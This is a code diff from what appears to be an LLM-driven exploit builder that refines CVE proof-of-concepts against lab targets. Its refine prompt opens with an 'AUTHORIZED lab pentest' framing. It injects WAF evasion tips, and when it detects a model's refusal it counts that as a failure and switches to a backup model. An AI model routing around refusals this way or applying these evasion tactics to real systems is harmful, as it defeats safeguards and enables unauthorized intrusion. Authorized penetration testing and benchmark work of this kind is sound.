-                          json={"command": command, "target": str(ip), "port": port, "timeout": _vt},
-                          headers={"x-api-key": API_KEY}, verify=False, timeout=_vt + 60)
-            d = lr.json() if lr.status_code < 400 else {}
-            output = d.get("output", "") or lr.text
-            ec = d.get("exit_code") if isinstance(d, dict) else None
-        except Exception as e:  # noqa: BLE001
-            output = f"listener error: {e}"; ec = None
-        metrics["target_runs"] += 1
-        metrics["run_seconds"] = round(metrics["run_seconds"] + (_t.time() - _r0), 3)
-        success = _poc_assertion_passes(assertion, output, ec)
+        # Pre-dispatch shell-syntax check: catch quote-balance / escape errors
+        # before wasting a 30-120s listener round-trip. Resweep forensics showed
+        # 2 of 11 PARTIAL cases ran all 5 iters on commands that /bin/sh refused
+        # at parse time. On fail: synthesize a syntax-error "output" so the
+        # existing refine path kicks in with specific feedback.
+        _syn_ok, _syn_err = _poc_shell_syntax_check(command)
+        if not _syn_ok:
+            _refused_now, _ = _poc_detect_llm_refusal(command)
+            if _refused_now:
+                output = (f"REFUSE: I cannot provide (pre-dispatch detected LLM "
+                          f"refusal prose instead of a shell command): {_syn_err}")
+                metrics.setdefault("skipped_runs_llm_refusal", 0)
+                metrics["skipped_runs_llm_refusal"] += 1
+                _poc_trace(run_id, "llm_refusal_refused", iteration=it,
+                           response=command[:400],
+                           extra={"detector": "pre-dispatch"})
+            else:
+                output = (f"/bin/sh: syntax error (pre-dispatch dry-parse refused "
+                          f"to run): {_syn_err}")
+                metrics.setdefault("skipped_runs_bad_syntax", 0)
+                metrics["skipped_runs_bad_syntax"] += 1
+                _poc_trace(run_id, "shell_syntax_refused", iteration=it,
+                           response=_syn_err[:400],
+                           extra={"command_preview": command[:200]})
+            ec = 2  # convention: shell parse errors exit 2
+            # Never-regress tracking: this iter FAILED the syntax check.
+            # Bump the consecutive-fail counter so the refine prompt below
+            # can inject the last-known-good command as a recovery base.
+            _consecutive_syntax_fails += 1
+            # Model fallback: this model is clearly stuck. After N fails
+            # swap to BUILD_POC_MODEL_FALLBACK (or routed cloud default) —
+            # once per build; subsequent iters stay on the backup.
+            if (not _model_fallback_fired
+                    and _consecutive_syntax_fails >= _MODEL_FALLBACK_AT):
+                _fallback_target = _MODEL_FALLBACK_TO  # None → routed cloud default
+                _poc_trace(run_id, "model_fallback", iteration=it,
+                           extra={"from": _active_model, "to": _fallback_target,
+                                  "reason": f"{_consecutive_syntax_fails}× consecutive shell_syntax_refused"})
+                _active_model = _fallback_target
+                _model_fallback_fired = True
+                metrics.setdefault("model_fallback_fired", 0)
+                metrics["model_fallback_fired"] += 1
+        else:
+            try:
+                lr = _hx.post(f"{listener.rstrip('/')}/vectors/run",
+                              json={"command": command, "target": str(ip), "port": port, "timeout": _vt},
+                              headers={"x-api-key": API_KEY}, verify=False, timeout=_vt + 60)
+                d = lr.json() if lr.status_code < 400 else {}
+                output = d.get("output", "") or lr.text
+                ec = d.get("exit_code") if isinstance(d, dict) else None
+            except Exception as e:  # noqa: BLE001
+                output = f"listener error: {e}"; ec = None
+            metrics["target_runs"] += 1
+            # Never-regress tracking: this iter's command passed the syntax
+            # check AND actually ran against the target. Capture it as the
+            # last-known-good base — the refine prompt will show it to the
+            # LLM when the next N iters' commands won't parse.
+            _last_valid_command = command
+            _last_valid_iter = it
+            _consecutive_syntax_fails = 0  # reset streak
+            # Auto-discovery: this command actually hit the target. Extract
+            # product-specific knowledge (endpoint path, action= param,
+            # CSRF-token source, cookie shape) and persist to
+            # discovered_app_knowledge + rag_documents under source=
+            # 'discovered_app_knowledge'. Future PoC builds for the SAME
+            # product retrieve it via _recon_discovered_knowledge and the
+            # planner's search_knowledge_base. Fires per-iter (not just
+            # per-build) so partial progress isn't lost when a loop times
+            # out before verification.
+            try:
+                _extract_discovered_facts(command, output, product, version,
+                                          cve, run_id,
+                                          verified=False, converged=False,
+                                          eid=eid)
+            except Exception as _edf:  # noqa: BLE001
+                logging.debug("extract discovered facts failed: %s", _edf)
+        _this_iter_seconds = round(_t.time() - _r0, 3)
+        metrics["run_seconds"] = round(metrics["run_seconds"] + _this_iter_seconds, 3)
+        # Hybrid verdict: regex-anchored first, then canary-loose, then semantic
+        # LLM pass (only when canary is present in output — grounded). Store the
+        # method so downstream can distinguish regex-verified from semantic-verified.
+        # elapsed_seconds is handed to the verdict so latency-based assertions
+        # (blind time-based SQLi, SLEEP, etc.) can verify without a visible
+        # marker in output.
+        _verdict = _poc_assertion_verdict_with_semantic(
+            assertion, output, ec, rationale=rationale, model=model,
+            elapsed_seconds=_this_iter_seconds)
+        success = _verdict["passed"]
+        verification_method = _verdict["method"]
+        verification_confidence = _verdict["confidence"]
         _poc_trace(run_id, "run", iteration=it, run_output=output, assertion_passed=success,
-                   extra={"target_family": list(fam), "drifted": drifted})
+                   extra={"target_family": list(fam), "drifted": drifted,
+                          "method": verification_method,
+                          "confidence": verification_confidence,
+                          "reason": _verdict.get("reason", "")})
+        # BLIND-TIMING CONFIRMATION — PROJECT RULE: a latency verdict is
+        # ALWAYS re-run with a scaled payload (SLEEP(N) → SLEEP(N+7)) to
+        # distinguish actual time-based SQLi from a target that is just
+        # slow. If the second run blocks for ~N+7s, the server IS executing
+        # the payload (CONFIRMED). If it blocks for roughly the same N
+        # seconds as the first run, the first run was a false positive and
+        # the verdict is DOWNGRADED to latency_unconfirmed.
+        # See tests/test_timing_confirmation.py + CLAUDE.md.
+        if success and verification_method in ("latency", "latency_anchored"):
+            try:
+                _conf = _timing_confirmation_rerun(
+                    command, assertion, ip, port, listener, API_KEY, _vt,
+                    delta=int(os.environ.get("TIMING_CONFIRM_DELTA_SEC", "7") or "7"))
+                _conf["first_s"] = _this_iter_seconds
+                _poc_trace(run_id, "latency_confirmation", iteration=it,
+                           extra=_conf)
+                if _conf.get("pattern") is None:
+                    # No timing payload found in command — can't confirm.
+                    # Treat the first-run latency as advisory, not proof.
+                    success = False
+                    verification_method = "latency_unconfirmable"
+                    verification_confidence = 0.3
+                elif not _conf.get("confirmed"):
+                    # Second run didn't scale — target is just slow, not
+                    # exploitable. Downgrade so the loop keeps refining
+                    # instead of stopping on a false positive.
+                    success = False
+                    verification_method = "latency_unconfirmed"
+                    verification_confidence = 0.2
+                else:
+                    # Confirmed — strengthen the verdict + add to the output
+                    # so downstream (semantic verify, store summary) sees it.
+                    verification_method = (
+                        "latency_confirmed_anchored"
+                        if verification_method == "latency_anchored"
+                        else "latency_confirmed")
+                    verification_confidence = 0.98
+                    output = (output or "") + (
+                        f"\n[LATENCY-CONFIRMED] re-ran with {_conf['pattern']}"
+                        f"({_conf.get('scaled_payload_new')}) and target "
+                        f"blocked for {_conf['second_s']}s (vs {_this_iter_seconds}s "
+                        f"on the first run) — server IS executing the timing payload")
+            except Exception as _ce:  # noqa: BLE001
+                logging.debug("timing confirmation failed: %s", _ce)
+        # Credit any pending patterns injected on the PREVIOUS iter if THIS
+        # iter converged. The guidance helped the LLM write a working
+        # command; after enough successes the auto-approve pass promotes
+        # them from pending to approved — permanent + visible in the
+        # operator's approved list, applied in every future build.
+        if success and _prev_pending:
+            try:
+                _record_refine_pattern_success(_prev_pending)
+                _poc_trace(run_id, "refine_pattern_success_credit",
+                           iteration=it, extra={"ids": _prev_pending,
+                                                "verdict_method": verification_method})
+            except Exception as _rpe:  # noqa: BLE001
+                logging.debug("refine pattern credit failed: %s", _rpe)
+        # Track consecutive same-tier status iters so the escalation hook
+        # below can fire. Any OTHER verdict resets every tier counter.
+        if verification_method in _status_tier_streak:
+            for k in _status_tier_streak:
+                _status_tier_streak[k] = (_status_tier_streak[k] + 1
+                                           if k == verification_method else 0)
+        else:
+            for k in _status_tier_streak:
+                _status_tier_streak[k] = 0
         if success or it >= max_iters:
             break
+        # Status-cluster escalation: 2+ iters in a row returned the same
+        # non-success HTTP status. Fire tier-specific guidance ONCE per build.
+        # Pulls the remediation text from the YAML. For 404 / 403 also runs
+        # live-path discovery through the kali-listener and appends a REAL
+        # path list for the model to pick from.
+        _tripped_tier = next((k for k, n in _status_tier_streak.items()
+                              if n >= 2 and not _status_escalation_done), None)
+        if _tripped_tier and it < max_iters:
+            _status_escalation_done = True  # fail-closed: never re-fire this build
+            try:
+                # YAML remediation text (same string the verdict carried, but
+                # the model needs it ONCE in the refine prompt, not every iter)
+                remediation = ""
+                for t in load_http_status_tiers():
+                    if t["method"] == _tripped_tier:
+                        remediation = t["remediation"]
+                        break
+                path_block = ""
+                if _tripped_tier in _TIERS_WITH_PATH_DISCOVERY:
+                    _tp = _t.time()
+                    live = _discover_live_paths(ip, port)
+                    _poc_trace(run_id, "escalation:path_discovery", iteration=it,
+                               response=f"found {len(live)} live paths" if live else "none",
+                               extra={"seconds": round(_t.time() - _tp, 2),
+                                      "tier": _tripped_tier,
+                                      "paths": [f"{p} [{s}]" for p, s in live[:10]]})
+                    if live:
+                        rendered = "\n".join(f"  {s}  {p}" for p, s in live[:15])
+                        path_block = (
+                            f"\nLIVE PATHS on {ip}:{port} (status != 404, from a "
+                            f"listener probe just now — these are REAL):\n{rendered}")
+                else:
+                    _poc_trace(run_id, f"escalation:{_tripped_tier}",
+                               iteration=it, response="text-only remediation",
+                               extra={"tier": _tripped_tier})
+                path_discovery_note = (
+                    f"\nSTATUS CLUSTER DETECTED — tier={_tripped_tier} on 2+ "
+                    f"iterations in a row. {remediation}{path_block}")
+            except Exception as e:  # noqa: BLE001
+                logging.debug("status-cluster escalation failed: %s", e)
+        # Escalation: once we've iterated ESCALATE_AFTER times without success and the
+        # primary recon wasn't already zap-active, kick a zap-active scan and fold its
+        # findings into the next refine. Fires exactly once per build.
+        if (not escalated and not _already_zap_active
+                and it >= _escalate_after and it < max_iters):
+            try:
+                _te = _t.time()
+                zactive = _zap_recon(ip, port, active_scan=True)
+                _poc_trace(run_id, "escalation:zap_active", iteration=it,
+                           response=(zactive or "no findings")[:1200],
+                           extra={"seconds": round(_t.time() - _te, 2)})
+                if zactive:
+                    escalation_guidance = ("\nESCALATION RECON (zap-active fired after "
+                                           f"{it} failed iters — treat as new authoritative "
+                                           "attack-surface intel): " + zactive)
+                # Focused per-URL active scan on the arjun / Burp-discovered
+                # params for this host. ZAP's generic active scan recurses the
+                # whole site; this runs focused attacks on URLs ZAP's spider
+                # may NOT have reached (arjun's parameter fanout, Burp's
+                # discovered_params table, any operator-supplied focused URLs).
+                focused_urls = []
+                # 1) arjun paths from this build's own recon
+                if arjun_discovered:
+                    for p in (arjun_discovered or [])[:20]:
+                        if p: focused_urls.append(p)
+                # 2) Burp / katana / etc. discovered_params for this host
+                try:
+                    with get_db() as _c, _c.cursor(cursor_factory=RealDictCursor) as _cur:
+                        _cur.execute("""
+                            SELECT DISTINCT url
+                            FROM discovered_params
+                            WHERE url ILIKE %s
+                            ORDER BY first_seen DESC NULLS LAST
+                            LIMIT 20
+                        """, (f"%{ip}%",))
+                        for r in _cur.fetchall():
+                            u = r.get("url")
+                            if u: focused_urls.append(u)
+                except Exception as _dpe:  # noqa: BLE001
+                    logging.debug("discovered_params lookup failed: %s", _dpe)
+                # 3) operator-supplied focused URLs from BuildPocBody (if any)
+                for u in (focused_urls_from_body or []):
+                    if u: focused_urls.append(u)
+                if focused_urls:
+                    _tf = _t.time()
+                    zfocused = _zap_focused_active_scan(ip, port, focused_urls)
+                    _poc_trace(run_id, "escalation:zap_focused_active", iteration=it,
+                               response=(zfocused or "no findings")[:1200],
+                               extra={"seconds": round(_t.time() - _tf, 2),
+                                      "url_count": len(focused_urls)})
+                    if zfocused:
+                        escalation_guidance = (escalation_guidance or "") + "\n" + zfocused
+                escalated = True
+            except Exception as e:  # noqa: BLE001
+                logging.debug("zap-active escalation failed: %s", e)
+                escalated = True  # don't retry on this build
         precond = ""
         if _poc_needs_precondition(output):
             pc = _fetch_preconditions(ip, port)
@@ -14208,14 +16382,127 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
                            f"YOUR exploit injects (create/write/reflect it via {cve}), then "
                            f"read it back. Do not match a value that could already exist. Keep "
                            f"the exploit aimed at {orig[1] or 'the vulnerable endpoint'}.")
+        # WAF-block detection in the run output: if we see a fingerprint from
+        # _WAF_FINGERPRINTS in this iteration's output, the WAF just intercepted the
+        # payload. Tell the LLM to reach for evasion variants rather than another plain
+        # rewrite that will hit the same block.
+        waf_hit_note = ""
+        try:
+            for needle, name, family in _WAF_FINGERPRINTS:
+                if needle in (output or "") or needle.lower() in (output or "").lower():
+                    ev = _waf_evasion_hint(family, "SQL injection")
+                    ev_rce = _waf_evasion_hint(family, "RCE / COMMAND INJECTION")
+                    waf_hit_note = (
+                        f"\nWAF BLOCK detected in the output (fingerprint: `{needle[:24]}` "
+                        f"= {name}, family {family}). The plain payload was intercepted. "
+                        f"REWRITE using evasion variants — do NOT retry the same shape. "
+                        f"For SQLi try: {ev or 'case swap + inline comments + encoded quote'}. "
+                        f"For RCE try: {ev_rce or 'case swap + $IFS + backticks + hex escape'}. "
+                        f"Pick ONE variant and go."
+                    )
+                    _poc_trace(run_id, "waf_block_detected", iteration=it,
+                               response=f"family={family} needle=`{needle[:24]}` — evasion tips added to refine prompt")
+                    break
+        except Exception:  # noqa: BLE001
+            pass
+        # RAG-driven error-pattern nudges — replaces the former hardcoded
+        # shell_syntax_note / refusal_note / latency_sticky_note blocks.
+        # knowledge/refine_error_patterns.yaml is the authoritative corpus;
+        # operators extend by appending YAML entries (loader embeds + inserts
+        # into refine_error_patterns table) OR by approving a learned
+        # pattern via /refine-patterns/approve. Benefits:
+        #   - operators extend coverage without a code change
+        #   - every LLM path (refine, synth, strategist, semantic verify,
+        #     tweak-with-burp) can call the same matcher
+        #   - the planner's search_knowledge_base retrieves them for
+        #     general consultation (both the structured match AND the
+        #     semantic embedding land in rag_documents)
+        rag_pattern_notes = ""
+        # Track which pending patterns we inject this iter — if the NEXT
+        # iter converges, each gets a success credit. Reused by the auto-
+        # approve path to promote proven-helpful learned patterns.
+        _pending_tried_this_iter = []
+        try:
+            matched = _match_refine_patterns(output, assertion, canary, command)
+            if matched:
+                blocks = []
+                for p in matched[:4]:  # cap at 4 so prompt doesn't balloon
+                    tag = p.get("title", p.get("id"))
+                    if p.get("pending"):
+                        tag = f"PENDING-TRIAL · {tag}"  # transparency
+                        _pending_tried_this_iter.append(p.get("id"))
+                    blocks.append(f"\n[{tag}]\n{p['guidance'].strip()}")
+                rag_pattern_notes = "".join(blocks)
+                _poc_trace(run_id, "refine_patterns_matched", iteration=it,
+                           extra={"ids": [p.get("id") for p in matched],
+                                  "pending": [p.get("id") for p in matched if p.get("pending")]})
+                # Record ONE trial per injected pending pattern. The success
+                # credit comes next iter (if assertion_passed).
+                if _pending_tried_this_iter:
+                    _record_refine_pattern_trial(_pending_tried_this_iter)
+        except Exception as _re:  # noqa: BLE001
+            logging.debug("refine pattern match failed: %s", _re)
+        # Pending patterns awaiting their success credit from the PREVIOUS
+        # iter's injection are tracked in metrics for cross-iter lookup.
+        _prev_pending = metrics.get("_pending_tried_last_iter") or []
+        metrics["_pending_tried_last_iter"] = _pending_tried_this_iter
+        # Keep the legacy inline notes as empty strings for the f-string below
+        # (so the composition stays explicit; everything that was hardcoded is
+        # now carried by rag_pattern_notes).
+        shell_syntax_note = ""
+        refusal_note = ""
+        # Latency assertion stickiness is now carried by the rag_pattern_notes
+        # matcher (knowledge/refine_error_patterns.yaml#timing_assertion_regressed).
+        # The JSON TEMPLATE at the end of the prompt still has to be shaped by
+        # the previous assertion kind (so the LLM copies the right shape); this
+        # is a RENDERING concern, not a knowledge concern, so it stays here.
+        _prev_had_latency = bool(isinstance(assertion, dict)
+                                 and assertion.get("min_seconds") is not None)
+        if _prev_had_latency:
+            _assert_template = (f"{{\"min_seconds\": {assertion.get('min_seconds')}, "
+                                f"\"max_seconds\": {assertion.get('max_seconds') or 30}, "
+                                f"\"canary\": \"{canary or ''}\"}}")
+        else:
+            _assert_template = f"{{\"expect_regex\": \"{canary or '<regex>'}\"}}"
+        # Never-regress note: when the LLM has broken the command N times
+        # in a row, REMIND it there was a working base and show it. This
+        # breaks the quote-death-spiral where every refine tries a slightly
+        # different wrong quoting approach. Fires at REFINE_REGRESS_FALLBACK_AT
+        # (default 2) consecutive syntax failures.
+        regress_note = ""
+        if (_last_valid_command is not None
+                and _consecutive_syntax_fails >= _REGRESS_FALLBACK_AT):
+            regress_note = (
+                f"\nNEVER-REGRESS — your last {_consecutive_syntax_fails} commands "
+                f"all failed /bin/sh parse. REVERT to this LAST KNOWN GOOD command "
+                f"(iter {_last_valid_iter}, actually ran against the target):\n"
+                f"```\n{_last_valid_command}\n```\n"
+                f"Change ONE thing — the specific param, path, or payload that "
+                f"needs to differ to EXPLOIT {cve}. Do NOT rewrite the quote "
+                f"structure, header shape, or shell var usage; those parsed. "
+                f"Keep the exact same wrapping and only vary the attack-surface "
+                f"token."
+            )
+        # Model-fallback note: when we've switched models due to a stuck
+        # LLM, tell the new one the previous commands' quote style broke so
+        # it doesn't try to copy them.
+        model_switch_note = ""
+        if _model_fallback_fired and _active_model != model:
+            model_switch_note = (
+                f"\nMODEL FALLBACK — the previous model got stuck in a "
+                f"shell-quoting loop. You are the backup. Write POSIX-safe "
+                f"shell: wrap curl bodies in single quotes, URL-encode any "
+                f"literal `'` as %27, keep each curl on ONE line, no "
+                f"backslash-escape of single quotes inside single-quoted strings."
+            )
         rprompt = (f"AUTHORIZED lab pentest. The PoC for {cve} on http://{ip}:{port} did NOT "
                    f"succeed.\nCommand: {command}\nOutput:\n{(output or '')[:1500]}{precond}"
-                   f"{anchor_note}\nFix the command so it EXPLOITS {cve} and makes the proof "
+                   f"{shell_syntax_note}{refusal_note}{rag_pattern_notes}{regress_note}{model_switch_note}{path_discovery_note}{waf_hit_note}{escalation_guidance}{anchor_note}\nFix the command so it EXPLOITS {cve} and makes the proof "
                    f"appear. Return ONE JSON object only: {{\"command\": \"<better command, may "
                    f"chain curl calls with ; and shell vars to fetch a token first>\", "
-                   f"\"assertion\": {{\"expect_regex\": \"{canary or '<regex>'}\"}}}}. No prose.")
+                   f"\"assertion\": {_assert_template}}}. No prose.")
         try:
-            res = _llm_for_model(rprompt, model=model, caller="cve_poc_refine")
+            res = _llm_for_model(rprompt, model=_active_model, caller="cve_poc_refine")
             rtext = res.get("response", "") if isinstance(res, dict) else str(res or "")
             if isinstance(res, dict) and res.get("model"):
                 llm_model = res["model"]
@@ -14224,12 +16511,54 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
             rtext = ""
         _poc_trace(run_id, "refine", iteration=it, prompt=rprompt, response=rtext, llm_model=llm_model)
         obj = _poc_extract_json(rtext)
+        # Malformed-JSON retry: forensics showed ~10/35 sweep failures were PARTIAL
+        # iters because the refine LLM returned prose/truncated-JSON on iter 1 and
+        # the loop broke before any real refinement. One-shot retry with a terser,
+        # stricter prompt — same guidance, but demands a bare JSON object.
+        if not obj or not obj.get("command"):
+            try:
+                strict_prompt = (
+                    "Your previous reply wasn't a parseable JSON object (likely trailing "
+                    "prose or truncation). Return ONE JSON object ONLY, no prose, no "
+                    "markdown fences, no leading text. Shape required: "
+                    f"{{\"command\": \"<single shell command fixing the PoC for {cve} on "
+                    f"http://{ip}:{port}>\", "
+                    f"\"assertion\": {{\"expect_regex\": \"{canary or '<regex>'}\"}}}}. "
+                    f"Previous failing command for context: {command[:400]}. "
+                    f"Previous output: {(output or '')[:400]}."
+                )
+                res2 = _llm_for_model(strict_prompt, model=model, caller="cve_poc_refine_retry")
+                rtext2 = res2.get("response", "") if isinstance(res2, dict) else str(res2 or "")
+                _acc_llm_metrics(metrics, res2)
+                _poc_trace(run_id, "refine_retry", iteration=it,
+                           prompt=strict_prompt[:400], response=rtext2[:400],
+                           llm_model=llm_model)
+                obj = _poc_extract_json(rtext2)
+            except Exception:  # noqa: BLE001
+                pass
         if not obj or not obj.get("command"):
             break
         command = str(obj["command"]).strip()
         la = obj.get("assertion")
-        if isinstance(la, dict) and la.get("expect_regex"):
-            assertion = _reanchor(la["expect_regex"])  # re-anchor: canary stays load-bearing
+        if isinstance(la, dict):
+            if la.get("expect_regex"):
+                assertion = _reanchor(la["expect_regex"])  # re-anchor: canary stays load-bearing
+            # LATENCY assertion — accept it with canary anchor so timing is
+            # the authoritative proof for blind time-based exploits (SQLi
+            # SLEEP, timing side-channels). canary stays load-bearing so
+            # the stored PoC is still CVE-anchored.
+            if la.get("min_seconds") is not None:
+                new_a = {"min_seconds": la["min_seconds"]}
+                if la.get("max_seconds") is not None:
+                    new_a["max_seconds"] = la["max_seconds"]
+                if canary:
+                    new_a["canary"] = canary
+                    new_a["cve_anchored"] = True
+                    # If LLM asked for canary_in_timing, honor it so we require
+                    # BOTH timing + canary — strongest timing verdict.
+                    if la.get("canary_in_timing"):
+                        new_a["canary_in_timing"] = True
+                assertion = new_a
 
     anchored = _poc_assertion_is_anchored(assertion, canary)
     # VERIFIED = the assertion passed AND it was anchored to the exploit's own effect.
@@ -14240,21 +16569,40 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
     # request, confirm it is not mere reflection (server echoing our input). A reflected
     # control token downgrades the verdict — the "effect" was our own input coming back.
     if verified and canary and canary in (command or ""):
+        # Listener/sink-verification exception: when the output contains "LISTENER-HIT: <canary>"
+        # or "SINK-VERIFIED: <canary>", the canary appeared in an OUT-OF-BAND channel we set
+        # up (our own listener log, or the CVE-Bench evaluator's /done poll). That marker
+        # IS the anchored proof — it can only appear if the target actually made the
+        # outbound request. Skip reflection because "reflection" for an OOB callback is
+        # not a coherent concept.
+        oob_hit = False
         try:
-            reflection, ctrl = _poc_reflection_detected(command, canary, ip, port, listener, _vt)
-            _poc_trace(run_id, "reflection_check", iteration=iters,
-                       response=f"reflected={reflection} control={ctrl}")
+            import re as _re
+            if _re.search(r"(LISTENER-HIT|SINK-VERIFIED)\s*:\s*[^\s]*" + _re.escape(canary),
+                          output or ""):
+                oob_hit = True
         except Exception:  # noqa: BLE001
-            reflection = False
-        # SQLi/SSTI exception: when the injected marker comes back INSIDE a SQL error /
-        # template-eval structure, the DB/engine EXECUTED our input (that IS the primitive) —
-        # not passive reflection. Keep it verified; the postex follow-on extracts real data.
-        if reflection and _looks_like_injection_execution(output):
-            reflection = False
+            pass
+        if oob_hit:
             _poc_trace(run_id, "reflection_check", iteration=iters,
-                       response="reflected match is inside an execution/error context -> primitive confirmed, not reflection")
-        if reflection:
-            verified = False
+                       response="OOB marker present (LISTENER-HIT / SINK-VERIFIED) -> "
+                                "canary appeared out-of-band, not in-response reflection; kept verified")
+        else:
+            try:
+                reflection, ctrl = _poc_reflection_detected(command, canary, ip, port, listener, _vt)
+                _poc_trace(run_id, "reflection_check", iteration=iters,
+                           response=f"reflected={reflection} control={ctrl}")
+            except Exception:  # noqa: BLE001
+                reflection = False
+            # SQLi/SSTI exception: when the injected marker comes back INSIDE a SQL error /
+            # template-eval structure, the DB/engine EXECUTED our input (that IS the primitive) —
+            # not passive reflection. Keep it verified; the postex follow-on extracts real data.
+            if reflection and _looks_like_injection_execution(output):
+                reflection = False
+                _poc_trace(run_id, "reflection_check", iteration=iters,
+                           response="reflected match is inside an execution/error context -> primitive confirmed, not reflection")
+            if reflection:
+                verified = False
     off_target = bool(success and not verified)
     security_test_id = None
     log_path = _poc_run_file(run_id)
@@ -14263,6 +16611,8 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
             "anchored": anchored, "drifted": drifted, "off_target": off_target,
             "reflection": reflection, "canary": canary, "iterations": iters, "log": log_path,
             "llm_model": llm_model, "built_at": built_at, "product": product, "version": version,
+            "verification_method": verification_method,
+            "verification_confidence": verification_confidence,
             "metrics": metrics}
     if verified:
         # Only a CVE-ANCHORED converged PoC is stored in the DB as a reusable security_test.
@@ -14289,7 +16639,9 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
             "drifted": drifted, "anchored": anchored, "reflection": reflection, "canary": canary,
             "iterations": iters, "final_command": command, "final_assertion": assertion,
             "llm_model": llm_model, "built_at": built_at, "metrics": metrics,
-            "security_test_id": security_test_id, "log_path": log_path}
+            "security_test_id": security_test_id, "log_path": log_path,
+            "verification_method": verification_method,
+            "verification_confidence": verification_confidence}
 
 
 def _poc_target_key(ip, port):
@@ -14327,16 +16679,41 @@ def _grant_poc(ip, port, eid, granted_by="operator", note=""):
 
 
 class BuildPocBody(BaseModel):
-    cve: str
-    ip: str
+    # cve is OPTIONAL — not every target has (or needs) a CVE. Operator may
+    # want to build a PoC against an arbitrary endpoint on observed product +
+    # version alone (e.g. a logic flaw, a misconfig, a 0-day). When absent,
+    # the endpoint synthesizes a NOCVE-<timestamp> token so run_id/hints
+    # remain unique.
+    cve: Optional[str] = None
+    # ip is only required when target_url is not supplied — the resolver below
+    # back-fills ip (and port) from a full URL. Validator enforces one-or-both.
+    ip: Optional[str] = None
     port: Optional[int] = None
     product: Optional[str] = None
     version: Optional[str] = None
-    max_iters: int = 5
+    # Operator can hand the builder a specific URL / endpoint to aim at — e.g.
+    # from Scan Results, Findings, or Burp. If supplied, host+port are parsed
+    # from it (unless ip/port are also set — explicit wins), and the path is
+    # folded into the operator hint channel so synth + refine aim there first.
+    target_url: Optional[str] = None
+    endpoint_hint: Optional[str] = None   # free-text operator note about the endpoint
+    max_iters: int = 30
     recon_first: bool = True    # do a fast target recon (fetch page/robots/forms) and feed
                                 # what's found to synth; catches shape/params synth would miss.
-    recon_source: Optional[str] = "basic"    # 'basic' (self-fetch, ~2s) | 'zap' (spider, ~90s)
-                                             # | 'both' (basic + zap) | 'zap-active' (spider+ascan, ~3-5min)
+    recon_source: Optional[str] = "basic"    # 'basic' (self-fetch, ~2s) | 'arjun' (param names, ~30s)
+                                             # | 'zap' (spider, ~90s) | 'both' (basic + zap)
+                                             # | 'params' (basic + arjun; recommended first pass)
+                                             # | 'full' (basic + arjun + zap; ~2-3min)
+                                             # | 'zap-active' (spider + active scan, ~3-5min).
+                                             # Port sweep always runs regardless.
+    hint: Optional[str] = None               # per-run operator guidance (highest priority; prepended
+                                             # ahead of recon/research/auth in synth guidance).
+    # focused_urls: operator-supplied list of specific URLs (typically pasted from
+    # Burp Repeater after manual tweaking) that the escalation path should run a
+    # focused ZAP active scan on, in addition to arjun's live findings. Each URL
+    # gets its own `recurse=false` active scan so attention isn't diluted across
+    # the whole site. Capped at 10 upstream.
+    focused_urls: List[str] = []
     # release=true is the operator authorizing this endpoint for PoC building — a
     # STANDING grant that persists until revoked/stopped. Agent-initiated builds leave
     # it false, so they run ONLY where a grant already exists (fail-closed).
@@ -14389,6 +16766,1308 @@ def establish_session_endpoint(body: EstablishSessionBody, authorized: bool = De
     except Exception:  # noqa: BLE001
         pass
     return {"ok": s.get("ok", False), **s}
+
+
+def _scout_open_ports(ip, primary_port, timeout=1.2):
+    """Fast TCP-connect scan of a common web/admin/db port list, plus an HTTP GET on any
+    port that answers. Returns a short guidance string naming alternate open ports and
+    a per-port banner/title. Empty when nothing else answers (or the target's down).
+    Rationale: some challenges expose the app on a non-default port, or expose a
+    SIDE-CHANNEL port (evaluator sink, admin UI, metrics) the exploit must reach —
+    e.g. CVE-Bench requires POSTing extracted data to target:9091/upload."""
+    import socket as _sk, httpx as _hx, re as _re, concurrent.futures as _cf
+    if not ip:
+        return ""
+    # Common ports we care about for pentest recon. Keep it tight — this is a fast probe,
+    # not a full scan. Ordered by frequency for readability of results.
+    common = [80, 443, 8000, 8001, 8006, 8008, 8080, 8081, 8088, 8443, 8888,
+              9000, 9001, 9080, 9090, 9091, 9092, 9093, 9200, 3000, 3306, 5000,
+              5432, 6379, 7000, 7001, 7474, 8009, 8500, 11211, 15672, 27017]
+    try:
+        primary = int(primary_port or 0)
+    except Exception:  # noqa: BLE001
+        primary = 0
+    if primary and primary not in common:
+        common = [primary] + common
+    open_ports = []
+    def _probe(port):
+        try:
+            with _sk.create_connection((ip, port), timeout=timeout):
+                return port
+        except Exception:  # noqa: BLE001
+            return None
+    with _cf.ThreadPoolExecutor(max_workers=16) as ex:
+        for r in ex.map(_probe, common):
+            if r:
+                open_ports.append(r)
+    if not open_ports:
+        return ""
+    # HTTP banner grab on each open port; a POST-only endpoint may 405 but we still learn.
+    banners = {}
+    def _banner(port):
+        for scheme in ("http", "https") if port in (443, 8443) else ("http",):
+            try:
+                with _hx.Client(verify=False, follow_redirects=False, timeout=3) as cli:
+                    r = cli.get(f"{scheme}://{ip}:{port}/")
+                    title = ""
+                    m = _re.search(r"<title[^>]*>([^<]{1,80})</title>", r.text or "", _re.I | _re.S)
+                    if m:
+                        title = m.group(1).strip()
+                    srv = (r.headers.get("server") or "")[:40]
+                    ct = (r.headers.get("content-type") or "").split(";")[0][:32]
+                    parts = [f"HTTP {r.status_code}"]
+                    if srv: parts.append(f"Server={srv}")
+                    if ct:  parts.append(f"CT={ct}")
+                    if title: parts.append(f'title="{title[:60]}"')
+                    return (port, " ".join(parts))
+            except Exception:  # noqa: BLE001
+                continue
+        return (port, "no HTTP")
+    with _cf.ThreadPoolExecutor(max_workers=8) as ex:
+        for port, b in ex.map(_banner, open_ports):
+            banners[port] = b
+    # Build the guidance line — flag the primary port and highlight alternates.
+    lines = []
+    for port in sorted(banners.keys()):
+        tag = " (requested)" if port == primary else ""
+        lines.append(f"    {port}{tag}: {banners[port]}")
+    alt = [p for p in open_ports if p != primary]
+    header = f"Open ports on {ip} ({len(open_ports)}): {open_ports}."
+    if alt:
+        header += f" ALT PORTS to consider: {alt}."
+    # Give the synth explicit callout when the primary is CLOSED but alternates answer.
+    if primary and primary not in open_ports and alt:
+        header += (f" WARNING: requested port {primary} is CLOSED; retry against an "
+                   f"open port from {alt}.")
